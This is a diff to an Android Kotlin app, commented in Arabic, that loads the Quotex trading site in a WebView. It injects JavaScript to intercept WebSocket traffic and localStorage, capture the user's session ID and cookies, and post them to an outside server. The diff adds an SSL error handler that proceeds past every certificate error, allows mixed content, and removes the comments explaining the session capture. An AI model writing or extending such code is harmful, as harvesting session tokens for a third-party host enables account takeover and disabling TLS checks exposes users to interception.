@@ -7,8 +7,6 @@ import android.os.Looper
 import android.view.ViewGroup
 import android.webkit.CookieManager
 import android.webkit.JavascriptInterface
-import android.webkit.WebResourceRequest
-import android.webkit.WebResourceResponse
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.widget.EditText
@@ -41,8 +39,9 @@ class MainActivity : AppCompatActivity() {
         .writeTimeout(120, TimeUnit.SECONDS)
         .build()
 
+    // ⚠️ تم تحديث الدومين هنا
     private val SERVER_URL = "https://signal-bott.onrender.com/api/link"
-    private val QX_DOMAIN = "https://qxbroker.com"
+    private val QX_DOMAIN = "https://quotex.com"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -105,6 +104,7 @@ class MainActivity : AppCompatActivity() {
             databaseEnabled = true
             loadWithOverviewMode = true
             useWideViewPort = true
+            mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
             userAgentString = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 " +
                     "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
         }
@@ -112,10 +112,13 @@ class MainActivity : AppCompatActivity() {
         CookieManager.getInstance().setAcceptCookie(true)
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
 
-        // 🌉 جسر JavaScript → Kotlin لاستقبال SSID
         webView.addJavascriptInterface(SessionBridge(), "OscarBridge")
 
         webView.webViewClient = object : WebViewClient() {
+            override fun onReceivedSslError(view: WebView?, handler: android.webkit.SslErrorHandler?, error: android.net.http.SslError?) {
+                handler?.proceed() // تجاهل أخطاء شهادات SSL
+            }
+
             override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
                 super.onPageStarted(view, url, favicon)
                 injectWebSocketInterceptor()
@@ -131,9 +134,8 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        webView.loadUrl("$QX_DOMAIN/en/sign-in")
+        webView.loadUrl("$QX_DOMAIN/ar/trade")
 
-        // 🔄 فحص دوري للكوكيز (خطة احتياطية)
         val handler = Handler(Looper.getMainLooper())
         val check = object : Runnable {
             override fun run() {
@@ -155,10 +157,6 @@ class MainActivity : AppCompatActivity() {
         handler.postDelayed(check, 5000)
     }
 
-    /**
-     * 💉 حقن JavaScript لاعتراض WebSocket
-     * هذه هي الطريقة الأساسية لالتقاط SSID من Quotex
-     */
     private fun injectWebSocketInterceptor() {
         val js = """
             (function() {
@@ -200,9 +198,6 @@ class MainActivity : AppCompatActivity() {
         webView.evaluateJavascript(js, null)
     }
 
-    /**
-     * 🔍 محاولة قراءة الجلسة من localStorage (خطة احتياطية)
-     */
     private fun tryReadLocalStorage() {
         val js = """
             (function() {
@@ -227,9 +222,6 @@ class MainActivity : AppCompatActivity() {
         webView.evaluateJavascript(js, null)
     }
 
-    /**
-     * 🌉 الجسر بين JavaScript و Kotlin
-     */
     inner class SessionBridge {
         @JavascriptInterface
         fun onSsid(ssid: String) {
@@ -250,9 +242,6 @@ class MainActivity : AppCompatActivity() {
             ?.substringAfter("=")
     }
 
-    /**
-     * 📤 إرسال الجلسة إلى السيرفر
-     */
     private fun sendToServer(ssid: String, cookies: String) {
         CoroutineScope(Dispatchers.IO).launch {
             try {
@@ -289,7 +278,7 @@ class MainActivity : AppCompatActivity() {
                             .setPositiveButton("إعادة المحاولة") { _, _ ->
                                 sent = false
                                 statusText.text = "📱 حاول تسجيل الدخول مرة أخرى"
-                                webView.loadUrl("$QX_DOMAIN/en/sign-in")
+                                webView.loadUrl("$QX_DOMAIN/ar/trade")
                             }
                             .setNegativeButton("إغلاق") { _, _ -> finish() }
                             .show()
